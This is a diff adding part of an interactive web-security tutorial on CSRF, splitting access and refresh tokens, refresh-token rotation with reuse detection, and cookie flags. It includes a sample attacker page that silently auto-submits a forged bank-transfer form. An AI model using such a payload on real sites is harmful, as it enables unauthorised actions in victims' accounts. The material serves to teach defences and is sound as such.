+      <strong>Ambient authority.</strong> A cookie is attached by the browser based purely on
+      <em>where the request is going</em>, never on <em>who asked for it</em>. Your API cannot tell
+      the difference between a request your React app made and one an attacker's page triggered.
+      Both arrive with the same valid cookie.
+    </p>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">attacker.io/free-iphone.html</span>
+      <button onclick="copyCode(this)" class="code-copy-btn">copy</button>
+    </div>
+    <pre class="code-pre"><span class="token-comment">&lt;!-- Looks like a giveaway page. Does something else. --&gt;</span>
+&lt;<span class="token-command">form</span> <span class="token-flag">id</span>=<span class="token-string">"f"</span> <span class="token-flag">action</span>=<span class="token-string">"https://api.yourbank.com/transfer"</span> <span class="token-flag">method</span>=<span class="token-string">"POST"</span>&gt;
+  &lt;<span class="token-command">input</span> <span class="token-flag">name</span>=<span class="token-string">"to"</span>     <span class="token-flag">value</span>=<span class="token-val">"attacker-account"</span>&gt;
+  &lt;<span class="token-command">input</span> <span class="token-flag">name</span>=<span class="token-string">"amount"</span> <span class="token-flag">value</span>=<span class="token-val">"50000"</span>&gt;
+&lt;/<span class="token-command">form</span>&gt;
+
+&lt;<span class="token-command">script</span>&gt;document.getElementById(<span class="token-string">'f'</span>).submit()&lt;/<span class="token-command">script</span>&gt;</pre>
+  </div>
+
+  <div class="stepper" data-stepper>
+    <div class="stepper-stage">
+      <svg viewBox="0 0 880 380" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Step-through diagram of a cross-site request forgery attack">
+        <defs>
+          <marker id="ah-csrf" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+            <path d="M0,0 L7,3.2 L0,6.4 Z" fill="var(--accent)"/>
+          </marker>
+          <marker id="ah-csrf2" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+            <path d="M0,0 L7,3.2 L0,6.4 Z" fill="var(--accent2)"/>
+          </marker>
+          <marker id="ah-csrf3" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto">
+            <path d="M0,0 L7,3.2 L0,6.4 Z" fill="var(--gold)"/>
+          </marker>
+        </defs>
+
+        <rect x="18" y="42" width="420" height="300" rx="10" fill="var(--paper)" stroke="var(--rule)" stroke-width="1.5"/>
+        <text x="34" y="32" class="svg-box-label" fill="var(--muted)">Victim's Browser</text>
+        <circle cx="40" cy="62" r="4" fill="var(--rule)"/><circle cx="54" cy="62" r="4" fill="var(--rule)"/><circle cx="68" cy="62" r="4" fill="var(--rule)"/>
+
+        <!-- Tabs -->
+        <rect x="36" y="84" width="184" height="82" rx="7" fill="var(--paper2)" stroke="var(--rule)"/>
+        <text x="52" y="110" class="svg-box-label" fill="var(--muted)">Tab 1</text>
+        <text x="52" y="134" class="svg-mono" fill="var(--ink)">yourbank.com</text>
+        <text x="52" y="154" class="svg-text" fill="var(--muted)">logged in</text>
+
+        <rect x="236" y="84" width="184" height="82" rx="7" fill="var(--paper2)" stroke="var(--rule)"/>
+        <text x="252" y="110" class="svg-box-label" fill="var(--muted)">Tab 2</text>
+        <text x="252" y="134" class="svg-mono" fill="var(--ink)">attacker.io</text>
+        <text x="252" y="154" class="svg-text" fill="var(--muted)">"free iPhone"</text>
+
+        <!-- Cookie jar -->
+        <rect x="36" y="248" width="384" height="72" rx="7" fill="var(--paper3)" stroke="var(--rule)"/>
+        <text x="52" y="272" class="svg-box-label" fill="var(--muted)">Shared cookie jar — one per browser, not per tab</text>
+        <text x="52" y="298" class="svg-mono" fill="var(--accent2)">session=abc123  ·  domain=yourbank.com</text>
+
+        <!-- Bank API -->
+        <rect x="638" y="140" width="222" height="100" rx="9" fill="var(--ink)"/>
+        <text x="658" y="172" class="svg-box-label" fill="#FFF">api.yourbank.com</text>
+        <text x="658" y="196" class="svg-text" fill="rgba(255,255,255,.55)">POST /transfer</text>
+        <text x="658" y="216" class="svg-text" fill="rgba(255,255,255,.55)">cookie present → authorised</text>
+
+        <g data-step="1">
+          <path d="M128,170 L128,242" stroke="var(--accent2)" stroke-width="2" fill="none" marker-end="url(#ah-csrf2)"/>
+          <text x="140" y="212" class="svg-mono" fill="var(--accent2)">Set-Cookie</text>
+        </g>
+
+        <g data-step="2">
+          <rect x="236" y="84" width="184" height="82" rx="7" fill="#FEF2F2" stroke="var(--accent)" stroke-width="1.5"/>
+          <text x="252" y="110" class="svg-box-label" fill="var(--accent)">Tab 2</text>
+          <text x="252" y="134" class="svg-mono" fill="var(--ink)">attacker.io</text>
+          <text x="252" y="154" class="svg-text" fill="var(--accent)">auto-submitting form</text>
+        </g>
+
+        <g data-step="3">
+          <path d="M424,120 C520,120 560,160 632,172" stroke="var(--accent)" stroke-width="2.5" fill="none"
+                marker-end="url(#ah-csrf)" class="animate-data-flow"/>
+          <text x="452" y="106" class="svg-mono" fill="var(--accent)">POST /transfer</text>
+        </g>
+
+        <g data-step="4">
+          <path d="M424,284 C540,284 560,232 632,214" stroke="var(--gold)" stroke-width="2.5" fill="none" marker-end="url(#ah-csrf3)"/>
+          <text x="450" y="302" class="svg-mono" fill="var(--gold)">browser attaches cookie automatically</text>
+        </g>
+
+        <g data-step="5">
+          <rect x="638" y="140" width="222" height="100" rx="9" fill="var(--accent)"/>
+          <text x="658" y="172" class="svg-box-label" fill="#FFF">api.yourbank.com</text>
+          <text x="658" y="198" class="svg-text" fill="#FFF">Valid session. Money moved.</text>
+          <text x="658" y="220" class="svg-text" fill="rgba(255,255,255,.75)">Response blocked — irrelevant</text>
+        </g>
+      </svg>
+    </div>
+
+    <div class="stepper-caption">
+      <div class="stepper-cap" data-cap="1">
+        <div class="stepper-cap-label">Step 01 — Normal login</div>
+        <p class="stepper-cap-text">The user logs into their bank. The server sets a session cookie. Nothing suspicious has happened, and nothing here is a mistake — this is the design working as intended.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="2">
+        <div class="stepper-cap-label">Step 02 — A different site</div>
+        <p class="stepper-cap-text">In another tab the user opens an unrelated page. A link from WhatsApp, a search result, an ad. The page silently auto-submits a form. The user sees nothing.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="3">
+        <div class="stepper-cap-label">Step 03 — The request fires</div>
+        <p class="stepper-cap-text">A POST goes to the bank's API. On its own this is harmless — the attacker's page has no credentials and no access to the bank's data.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="4">
+        <div class="stepper-cap-label">Step 04 — The browser helps the attacker</div>
+        <p class="stepper-cap-text">This is the actual attack. The cookie jar belongs to the browser, not to the tab. The request is heading for yourbank.com, so the browser attaches the session cookie automatically. The attacker never touched it, never read it, and never needed to.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="5">
+        <div class="stepper-cap-label">Step 05 — Executed</div>
+        <p class="stepper-cap-text">The server sees a valid session and performs the transfer. The same-origin policy stops the attacker from reading the response — which sounds like a defence, but it isn't. They wanted the side effect, not the data.</p>
+      </div>
+    </div>
+
+    <div class="stepper-controls">
+      <button class="step-btn step-prev">← Back</button>
+      <span class="step-counter">01 / 05</span>
+      <button class="step-btn step-next">Forward →</button>
+    </div>
+  </div>
+
+  <div class="note-box">
+    <div class="note-box-icon">💡</div>
+    <p class="note-box-text">
+      The one-line summary worth memorising: <strong>XSS steals the credential, CSRF borrows it.</strong>
+      XSS takes the key. CSRF makes the browser open the door while the key stays in your pocket.
+    </p>
+  </div>
+
+  <div class="quiz-box">
+    <p class="quiz-question">In a CSRF attack, what does the attacker actually obtain?</p>
+    <div class="quiz-options" id="quiz-4-1">
+      <button onclick="answerQuiz('quiz-4-1', this, false)" class="quiz-option">A &nbsp;—&nbsp; A copy of the session cookie they can reuse later</button>
+      <button onclick="answerQuiz('quiz-4-1', this, true)" class="quiz-option">B &nbsp;—&nbsp; A state-changing action executed under the victim's identity, with no access to the credential</button>
+    </div>
+    <div class="quiz-feedback hidden" id="quiz-4-1-feedback"></div>
+  </div>
+</section>
+
+<!-- ════════════ 05 ════════════ -->
+<section class="section-block animate-fade-up" id="s5">
+  <div class="section-header">
+    <div class="section-num-big">05</div>
+    <div class="section-header-text">
+      <div class="section-title">The split — two tokens, two homes</div>
+      <div class="section-subtitle">Put each token where the other one's weakness does not apply</div>
+    </div>
+  </div>
+
+  <p>
+    Now the design makes sense. We could not win with one token because we had to pick one column
+    of that table. So we stop picking. <strong>We use two tokens, give them different jobs, and store
+    each one where the attack against the other cannot reach it.</strong>
+  </p>
+
+  <div class="table-scroll">
+  <table class="flag-table">
+    <thead><tr><th>Token</th><th>Job</th><th>Lifetime</th><th>Home</th></tr></thead>
+    <tbody>
+      <tr>
+        <td><span class="flag-name">access token</span></td>
+        <td>Proves who you are on every API call</td>
+        <td><span class="flag-val">5–15 min</span></td>
+        <td>A JavaScript variable in memory</td>
+      </tr>
+      <tr>
+        <td><span class="flag-name">refresh token</span></td>
+        <td>Proves you are allowed to get a new access token</td>
+        <td><span class="flag-val">7–30 days</span></td>
+        <td>httpOnly cookie, scoped to the refresh path</td>
+      </tr>
+    </tbody>
+  </table>
+  </div>
+
+  <h3>Why the access token lives in memory</h3>
+  <ul>
+    <li><strong>CSRF becomes structurally impossible on your API routes.</strong> You attach it yourself in an <code>Authorization</code> header. An attacker's page cannot set that header on a cross-site request, and the browser will never attach it for them. The attack has nothing to work with.</li>
+    <li><strong>It never touches disk.</strong> Close the tab and it is gone. Nothing left for an extension, a forensic tool, or a shared machine to find later.</li>
+    <li><strong>Short life bounds the damage.</strong> JWTs are stateless — you cannot revoke one without a database lookup on every request, which is exactly the cost you were avoiding. So instead of revoking, you expire. Fifteen minutes is your worst case.</li>
+  </ul>
+
+  <h3>Why the refresh token lives in an httpOnly cookie</h3>
+  <ul>
+    <li><strong>JavaScript cannot read it. At all.</strong> <code>document.cookie</code> does not show it. The XSS payload from section 3 has nothing to exfiltrate.</li>
+    <li><strong>It is the long-lived credential</strong>, so it is the one worth protecting hardest. The 15-minute token is a much smaller prize.</li>
+    <li><strong>It is stored server-side</strong>, unlike the access token, so it is genuinely revocable — which is what makes section 6 possible.</li>
+  </ul>
+
+  <div class="stepper" data-stepper>
+    <div class="stepper-stage">
+      <svg viewBox="0 0 880 430" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Step-through diagram of the two-token login and refresh flow">
+        <defs>
+          <marker id="ah-f1" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto"><path d="M0,0 L7,3.2 L0,6.4 Z" fill="var(--accent3)"/></marker>
+          <marker id="ah-f2" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto"><path d="M0,0 L7,3.2 L0,6.4 Z" fill="var(--accent2)"/></marker>
+          <marker id="ah-f3" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto"><path d="M0,0 L7,3.2 L0,6.4 Z" fill="var(--accent)"/></marker>
+        </defs>
+
+        <rect x="40" y="22" width="260" height="40" rx="7" fill="var(--ink)"/>
+        <text x="58" y="47" class="svg-box-label" fill="#FFF">Browser (your React app)</text>
+        <rect x="580" y="22" width="260" height="40" rx="7" fill="var(--ink)"/>
+        <text x="598" y="47" class="svg-box-label" fill="#FFF">Your API server</text>
+
+        <rect x="40" y="76" width="124" height="46" rx="6" fill="var(--paper3)" stroke="var(--rule)"/>
+        <text x="52" y="95" class="svg-box-label" fill="var(--muted)">memory</text>
+        <text x="52" y="113" class="svg-mono" fill="var(--muted)">accessToken = null</text>
+
+        <rect x="176" y="76" width="124" height="46" rx="6" fill="var(--paper3)" stroke="var(--rule)"/>
+        <text x="188" y="95" class="svg-box-label" fill="var(--muted)">cookie jar</text>
+        <text x="188" y="113" class="svg-mono" fill="var(--muted)">empty</text>
+
+        <line x1="170" y1="134" x2="170" y2="416" stroke="var(--rule)" stroke-width="1.5" stroke-dasharray="4 4"/>
+        <line x1="710" y1="66"  x2="710" y2="416" stroke="var(--rule)" stroke-width="1.5" stroke-dasharray="4 4"/>
+
+        <g data-step="1">
+          <path d="M170,160 L702,160" stroke="var(--accent3)" stroke-width="2" fill="none" marker-end="url(#ah-f1)"/>
+          <text x="188" y="152" class="svg-mono" fill="var(--accent3)">POST /auth/login  { email, password }</text>
+        </g>
+
+        <g data-step="2">
+          <path d="M710,200 L178,200" stroke="var(--accent2)" stroke-width="2" fill="none" marker-end="url(#ah-f2)"/>
+          <text x="188" y="192" class="svg-mono" fill="var(--accent2)">200  body: accessToken  ·  Set-Cookie: rt (httpOnly)</text>
+          <rect x="40" y="76" width="124" height="46" rx="6" fill="#E7F1EC" stroke="var(--accent2)"/>
+          <text x="52" y="95" class="svg-box-label" fill="var(--accent2)">memory</text>
+          <text x="52" y="113" class="svg-mono" fill="var(--ink)">accessToken ✓</text>
+          <rect x="176" y="76" width="124" height="46" rx="6" fill="#E7F1EC" stroke="var(--accent2)"/>
+          <text x="188" y="95" class="svg-box-label" fill="var(--accent2)">cookie jar</text>
+          <text x="188" y="113" class="svg-mono" fill="var(--ink)">rt · httpOnly</text>
+        </g>
+
+        <g data-step="3">
+          <path d="M170,244 L702,244" stroke="var(--accent3)" stroke-width="2" fill="none" marker-end="url(#ah-f1)"/>
+          <text x="188" y="236" class="svg-mono" fill="var(--accent3)">GET /api/orders   Authorization: Bearer &lt;access&gt;</text>
+        </g>
+
+        <g data-step="4">
+          <path d="M710,286 L178,286" stroke="var(--accent)" stroke-width="2" fill="none" marker-end="url(#ah-f3)"/>
+          <text x="188" y="278" class="svg-mono" fill="var(--accent)">401  access token expired</text>
+        </g>
+
+        <g data-step="5">
+          <path d="M170,330 L702,330" stroke="var(--gold)" stroke-width="2.5" fill="none" marker-end="url(#ah-f1)" class="animate-data-flow"/>
+          <text x="188" y="322" class="svg-mono" fill="var(--gold)">POST /auth/refresh   (cookie attached by browser)</text>
+        </g>
+
+        <g data-step="6">
+          <path d="M710,372 L178,372" stroke="var(--accent2)" stroke-width="2" fill="none" marker-end="url(#ah-f2)"/>
+          <text x="188" y="364" class="svg-mono" fill="var(--accent2)">200  new accessToken  ·  Set-Cookie: rt2 (rotated)</text>
+          <path d="M170,406 L702,406" stroke="var(--accent3)" stroke-width="2" fill="none" marker-end="url(#ah-f1)"/>
+          <text x="188" y="398" class="svg-mono" fill="var(--accent3)">retry original request → 200 OK</text>
+        </g>
+      </svg>
+    </div>
+
+    <div class="stepper-caption">
+      <div class="stepper-cap" data-cap="1">
+        <div class="stepper-cap-label">Step 01 — Login</div>
+        <p class="stepper-cap-text">The only time the password is ever sent. Everything after this is tokens.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="2">
+        <div class="stepper-cap-label">Step 02 — Two tokens, two destinations</div>
+        <p class="stepper-cap-text">The access token comes back in the response body, and your code puts it in a variable. The refresh token comes back as a <code>Set-Cookie</code> header — your code never sees it and never touches it. This asymmetry is the entire design.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="3">
+        <div class="stepper-cap-label">Step 03 — Normal API calls</div>
+        <p class="stepper-cap-text">You attach the access token manually in an <code>Authorization</code> header. Because it is manual, no cross-site page can forge this request. CSRF has no way in here.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="4">
+        <div class="stepper-cap-label">Step 04 — Expiry</div>
+        <p class="stepper-cap-text">Fifteen minutes later the token expires and the API returns 401. This is normal operation, not an error — expect it and handle it silently.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="5">
+        <div class="stepper-cap-label">Step 05 — Refresh</div>
+        <p class="stepper-cap-text">One call to the refresh endpoint. You send no credential in your code — the browser attaches the httpOnly cookie for you. This is the only route where cookie auto-attachment is used, which is why it is also the only route that needs CSRF protection.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="6">
+        <div class="stepper-cap-label">Step 06 — New tokens, retry</div>
+        <p class="stepper-cap-text">A fresh access token lands in memory, and the refresh token is rotated — the old one is now dead. The original request is retried and the user sees nothing at all.</p>
+      </div>
+    </div>
+
+    <div class="stepper-controls">
+      <button class="step-btn step-prev">← Back</button>
+      <span class="step-counter">01 / 06</span>
+      <button class="step-btn step-next">Forward →</button>
+    </div>
+  </div>
+
+  <h3>What each design actually survives</h3>
+  <div class="table-scroll">
+  <table class="compare-table">
+    <thead><tr><th>Scenario</th><th>Single token in localStorage</th><th>Access in memory + refresh in httpOnly cookie</th></tr></thead>
+    <tbody>
+      <tr><td class="cell-title">CSRF on API routes</td><td class="cell-muted">Safe (never auto-sent)</td><td class="cell-highlight">Safe — same reason</td></tr>
+      <tr><td class="cell-title">CSRF on refresh route</td><td class="cell-muted">N/A</td><td class="cell-bad">Exposed — needs SameSite + path scoping</td></tr>
+      <tr><td class="cell-title">XSS reads the credential</td><td class="cell-bad">Yes — the long-lived token</td><td class="cell-highlight">Only a 15-minute access token</td></tr>
+      <tr><td class="cell-title">What leaves the machine</td><td class="cell-bad">A 30-day credential</td><td class="cell-highlight">At most a 15-minute one</td></tr>
+      <tr><td class="cell-title">Damage after the tab closes</td><td class="cell-bad">Weeks of full account access</td><td class="cell-highlight">Ends within minutes</td></tr>
+      <tr><td class="cell-title">Attacker acting inside the live page</td><td class="cell-bad">Full access</td><td class="cell-bad">Full access — see section 8</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="warning-box">
+    <div class="warning-box-icon">⚠️</div>
+    <p class="warning-box-text">
+      Read that last row carefully, because most tutorials never mention it.
+      <strong>httpOnly does not make you XSS-proof.</strong> A script on your origin can simply call
+      <code>/auth/refresh</code> itself and get a working access token. What this design changes is
+      <em>persistence</em> — whether the attacker walks away with a durable credential or is stuck
+      inside a browser tab. Section 8 deals with this honestly.
+    </p>
+  </div>
+
+  <div class="quiz-box">
+    <p class="quiz-question">Why is CSRF structurally impossible against your normal API routes in this design?</p>
+    <div class="quiz-options" id="quiz-5-1">
+      <button onclick="answerQuiz('quiz-5-1', this, false)" class="quiz-option">A &nbsp;—&nbsp; Because the access token is a JWT and JWTs are signed</button>
+      <button onclick="answerQuiz('quiz-5-1', this, true)" class="quiz-option">B &nbsp;—&nbsp; Because the token is attached manually in a header, and a cross-site page cannot set that header</button>
+    </div>
+    <div class="quiz-feedback hidden" id="quiz-5-1-feedback"></div>
+  </div>
+</section>
+
+<!-- ════════════ 06 ════════════ -->
+<section class="section-block animate-fade-up" id="s6">
+  <div class="section-header">
+    <div class="section-num-big">06</div>
+    <div class="section-header-text">
+      <div class="section-title">Rotation &amp; reuse detection</div>
+      <div class="section-subtitle">The part that turns storage into an actual defence</div>
+    </div>
+  </div>
+
+  <p>
+    Here is a question worth putting to your students: if the refresh token sits in an httpOnly cookie
+    for thirty days and never changes, <strong>how is that different from a plain old session cookie?</strong>
+  </p>
+  <p>
+    It isn't. Without rotation you have built a session cookie with extra steps. Rotation is what
+    earns the complexity.
+  </p>
+
+  <div class="concept-box">
+    <div class="concept-box-label">Key Concept</div>
+    <p class="concept-box-text">
+      <strong>Refresh tokens are single-use.</strong> Every call to <code>/auth/refresh</code> issues a
+      brand new refresh token and marks the old one consumed. Tokens descending from one login form a
+      <strong>family</strong>. If a consumed token is ever presented again, two parties are holding
+      the same credential — and only one of them is supposed to. That is theft, detected.
+    </p>
+  </div>
+
+  <div class="stepper" data-stepper>
+    <div class="stepper-stage">
+      <svg viewBox="0 0 880 330" xmlns="http://www.w3.org/2000/svg" role="img" aria-label="Step-through diagram of refresh token rotation and reuse detection">
+        <defs>
+          <marker id="ah-r1" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto"><path d="M0,0 L7,3.2 L0,6.4 Z" fill="var(--accent2)"/></marker>
+          <marker id="ah-r2" markerWidth="9" markerHeight="9" refX="7" refY="3.2" orient="auto"><path d="M0,0 L7,3.2 L0,6.4 Z" fill="var(--accent)"/></marker>
+        </defs>
+
+        <text x="30" y="34" class="svg-box-label" fill="var(--muted)">One login = one token family</text>
+
+        <g data-step="1">
+          <rect x="30" y="52" width="120" height="58" rx="7" fill="#E7F1EC" stroke="var(--accent2)"/>
+          <text x="44" y="76" class="svg-mono" fill="var(--ink)">RT-1</text>
+          <text x="44" y="96" class="svg-text" fill="var(--accent2)">consumed</text>
+          <path d="M154,81 L186,81" stroke="var(--accent2)" stroke-width="2" marker-end="url(#ah-r1)"/>
+
+          <rect x="192" y="52" width="120" height="58" rx="7" fill="#E7F1EC" stroke="var(--accent2)"/>
+          <text x="206" y="76" class="svg-mono" fill="var(--ink)">RT-2</text>
+          <text x="206" y="96" class="svg-text" fill="var(--accent2)">consumed</text>
+          <path d="M316,81 L348,81" stroke="var(--accent2)" stroke-width="2" marker-end="url(#ah-r1)"/>
+
+          <rect x="354" y="52" width="120" height="58" rx="7" fill="var(--paper3)" stroke="var(--rule)"/>
+          <text x="368" y="76" class="svg-mono" fill="var(--ink)">RT-3</text>
+          <text x="368" y="96" class="svg-text" fill="var(--muted)">active</text>
+
+          <rect x="560" y="42" width="290" height="110" rx="9" fill="var(--ink)"/>
+          <text x="580" y="70" class="svg-box-label" fill="#FFF">Auth server — family table</text>
+          <text x="580" y="96" class="svg-mono" fill="rgba(255,255,255,.6)">family: f_91ac · user: 4471</text>
+          <text x="580" y="118" class="svg-mono" fill="rgba(255,255,255,.6)">RT-1 used · RT-2 used · RT-3 live</text>
+        </g>
+
+        <g data-step="2">
+          <rect x="192" y="204" width="150" height="58" rx="7" fill="#FEF2F2" stroke="var(--accent)" stroke-dasharray="5 4"/>
+          <text x="206" y="228" class="svg-mono" fill="var(--accent)">RT-2 (stolen copy)</text>
+          <text x="206" y="248" class="svg-text" fill="var(--accent)">attacker holds it</text>
+          <path d="M252,116 L252,198" stroke="var(--accent)" stroke-width="2" stroke-dasharray="5 4" marker-end="url(#ah-r2)"/>
+        </g>
+
+        <g data-step="3">
+          <path d="M346,232 C460,232 480,180 554,158" stroke="var(--accent)" stroke-width="2.5" fill="none" marker-end="url(#ah-r2)" class="animate-data-flow"/>
+          <text x="366" y="212" class="svg-mono" fill="var(--accent)">replays RT-2</text>
+          <text x="560" y="182" class="svg-mono" fill="var(--accent)">RT-2.usedAt is already set → reuse detected</text>
+        </g>
+
+        <g data-step="4">
+          <rect x="30" y="52" width="444" height="58" rx="7" fill="#FEF2F2" stroke="var(--accent)" stroke-width="2"/>
+          <text x="44" y="88" class="svg-mono" fill="var(--accent)">RT-1 · RT-2 · RT-3 — entire family revoked</text>
+          <rect x="192" y="204" width="150" height="58" rx="7" fill="#FEF2F2" stroke="var(--accent)" stroke-width="2"/>
+          <text x="206" y="240" class="svg-mono" fill="var(--accent)">stolen copy: dead</text>
+          <text x="560" y="212" class="svg-text" fill="var(--accent)">Every session from this login is terminated.</text>
+          <text x="560" y="232" class="svg-text" fill="var(--muted)">Attacker and real user both log in again.</text>
+        </g>
+      </svg>
+    </div>
+
+    <div class="stepper-caption">
+      <div class="stepper-cap" data-cap="1">
+        <div class="stepper-cap-label">Step 01 — Normal rotation</div>
+        <p class="stepper-cap-text">Every refresh consumes the current token and mints the next. The server keeps the chain, so at any moment exactly one token in the family is live.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="2">
+        <div class="stepper-cap-label">Step 02 — Theft</div>
+        <p class="stepper-cap-text">Somehow the attacker obtains RT-2 — a leaked log, a proxy, a stolen backup. They now hold what looks like a perfectly valid credential.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="3">
+        <div class="stepper-cap-label">Step 03 — Detection</div>
+        <p class="stepper-cap-text">The moment they use it, the server sees a token whose <code>usedAt</code> is already set. There is no innocent explanation for that in a single-use scheme: two parties are holding one token.</p>
+      </div>
+      <div class="stepper-cap hidden" data-cap="4">
+        <div class="stepper-cap-label">Step 04 — Revoke the family</div>
+        <p class="stepper-cap-text">You cannot tell which of the two is the real user, so you trust neither. The whole family dies and everyone re-authenticates. Logging the real user out is annoying; leaving an attacker inside is worse.</p>
+      </div>
+    </div>
+
+    <div class="stepper-controls">
+      <button class="step-btn step-prev">← Back</button>
+      <span class="step-counter">01 / 04</span>
+      <button class="step-btn step-next">Forward →</button>
+    </div>
+  </div>
+
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">server / auth.controller.js</span>
+      <button onclick="copyCode(this)" class="code-copy-btn">copy</button>
+    </div>
+    <pre class="code-pre"><span class="token-comment">// never store the raw token — store a hash, like a password</span>
+<span class="token-command">const</span> stored = <span class="token-command">await</span> RefreshToken.findOne({ hash: sha256(incoming) })
+
+<span class="token-command">if</span> (!stored) <span class="token-command">throw</span> <span class="token-command">new</span> AuthError(<span class="token-string">'unknown token'</span>)
+
+<span class="token-command">if</span> (stored.usedAt) {
+  <span class="token-comment">// a consumed token came back → two parties hold it → theft</span>
+  <span class="token-command">await</span> RefreshToken.deleteMany({ family: stored.family })
+  <span class="token-command">await</span> auditLog(<span class="token-string">'refresh_reuse'</span>, { user: stored.userId, family: stored.family })
+  <span class="token-command">throw</span> <span class="token-command">new</span> AuthError(<span class="token-string">'reuse detected — family revoked'</span>)
+}
+
+stored.usedAt = <span class="token-command">new</span> <span class="token-val">Date</span>()
+<span class="token-command">await</span> stored.save()
+
+<span class="token-command">const</span> next = <span class="token-command">await</span> issueRefreshToken({ user: stored.userId, family: stored.family })
+res.cookie(<span class="token-string">'rt'</span>, next.raw, cookieOptions)
+res.json({ accessToken: signAccessToken(stored.userId) })</pre>
+  </div>
+
+  <div class="warning-box">
+    <div class="warning-box-icon">⚠️</div>
+    <p class="warning-box-text">
+      <strong>Rotation is detection, not prevention.</strong> Whoever refreshes first wins. If the
+      attacker gets there before the real user, the attacker holds the live token and your legitimate
+      user is the one who gets logged out on their next refresh. That is the correct failure mode —
+      fail closed — but be clear that a window existed.
+    </p>
+  </div>
+
+  <h3>The false positive that will bite you</h3>
+  <p>
+    Client sends a refresh. The server rotates successfully. The response is lost on a flaky mobile
+    network. The client retries with the old token — and your system screams <em>theft</em> at a user
+    who did nothing wrong.
+  </p>
+  <p>
+    Handle it with a short grace window: accept the immediately-previous token for 15–30 seconds and
+    return the <em>same</em> new token idempotently. Skip this and every user on a patchy connection
+    gets randomly logged out.
+  </p>
+
+  <div class="note-box">
+    <div class="note-box-icon">💡</div>
+    <p class="note-box-text">
+      There is a nice second-order effect here. An attacker who tries to build <strong>persistence</strong>
+      by repeatedly refreshing is racing the real app's own refresh cycle — and that race is exactly what
+      trips reuse detection. Greed makes them noisy.
+    </p>
+  </div>
+
+  <div class="quiz-box">
+    <p class="quiz-question">Your server sees a refresh token whose <code>usedAt</code> is already set. What is the correct response?</p>
+    <div class="quiz-options" id="quiz-6-1">
+      <button onclick="answerQuiz('quiz-6-1', this, false)" class="quiz-option">A &nbsp;—&nbsp; Reject just that request and let the existing session carry on</button>
+      <button onclick="answerQuiz('quiz-6-1', this, true)" class="quiz-option">B &nbsp;—&nbsp; Revoke the entire token family, because you cannot tell which holder is the real user</button>
+    </div>
+    <div class="quiz-feedback hidden" id="quiz-6-1-feedback"></div>
+  </div>
+</section>
+
+<!-- ════════════ 07 ════════════ -->
+<section class="section-block animate-fade-up" id="s7">
+  <div class="section-header">
+    <div class="section-num-big">07</div>
+    <div class="section-header-text">
+      <div class="section-title">Best practices</div>
+      <div class="section-subtitle">The settings and patterns that make the design actually hold</div>
+    </div>
+  </div>
+
+  <h3>Cookie flags — every one of these matters</h3>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">server / cookie options</span>
+      <button onclick="copyCode(this)" class="code-copy-btn">copy</button>
+    </div>
+    <pre class="code-pre"><span class="token-command">const</span> cookieOptions = {
+  <span class="token-yaml-key">httpOnly</span>: <span class="token-val">true</span>,
+  <span class="token-yaml-key">secure</span>:   process.env.NODE_ENV === <span class="token-string">'production'</span>,
+  <span class="token-yaml-key">sameSite</span>: <span class="token-string">'strict'</span>,
+  <span class="token-yaml-key">path</span>:     <span class="token-string">'/api/auth/refresh'</span>,
+  <span class="token-yaml-key">maxAge</span>:   <span class="token-val">7</span> * <span class="token-val">24</span> * <span class="token-val">60</span> * <span class="token-val">60</span> * <span class="token-val">1000</span>
+}</pre>
+  </div>
+
+  <div class="table-scroll">
+  <table class="flag-table">
+    <thead><tr><th>Flag</th><th>Value Used</th><th>What it does</th></tr></thead>
+    <tbody>
+      <tr><td><span class="flag-name">httpOnly</span></td><td><span class="flag-val">true</span></td><td>JavaScript cannot read the cookie. This is the flag that stops XSS from carrying the refresh token off the machine.</td></tr>
+      <tr><td><span class="flag-name">secure</span></td><td><span class="flag-val">true</span></td><td>Only ever sent over HTTPS, so the token never crosses a plaintext connection.</td></tr>
+      <tr><td><span class="flag-name">sameSite</span></td><td><span class="flag-val">strict</span></td><td>Not attached to cross-site requests. This is your CSRF defence on the one route that still uses cookies.</td></tr>
+      <tr><td><span class="flag-name">path</span></td><td><span class="flag-val">/api/auth/refresh</span></td><td>The cookie is attached to that single endpoint instead of riding along on every request to your domain. Smaller exposure surface, fewer places it can leak.</td></tr>
+      <tr><td><span class="flag-name">maxAge</span></td><td><span class="flag-val">7 days</span></td><td>Hard expiry on the cookie itself, independent of anything stored server-side.</td></tr>
+    </tbody>
+  </table>
+  </div>
+
+  <div class="note-box">
+    <div class="note-box-icon">💡</div>
+    <p class="note-box-text">
+      If your API genuinely lives on a different site — <code>app.com</code> calling <code>api.other.com</code> —
+      you are forced into <code>sameSite: 'none'</code>, and a <strong>CSRF token on the refresh endpoint stops being optional</strong>.
+      Where you can, put the API behind the same site (a path or a subdomain) and keep <code>strict</code>.
+    </p>
+  </div>
+
+  <h3>Booting the app after a page reload</h3>
+  <p>
+    Memory is empty on every reload. That is by design, but it means the app cannot render anything
+    auth-dependent until it has asked for a token.
+  </p>
+  <div class="code-block">
+    <div class="code-header">
+      <span class="code-label">client / bootstrap</span>
+      <button onclick="copyCode(this)" class="code-copy-btn">copy</button>
+    </div>
+    <pre class="code-pre"><span class="token-command">async function</span> <span class="token-val">bootstrap</span>() {
+  <span class="token-command">try</span> {
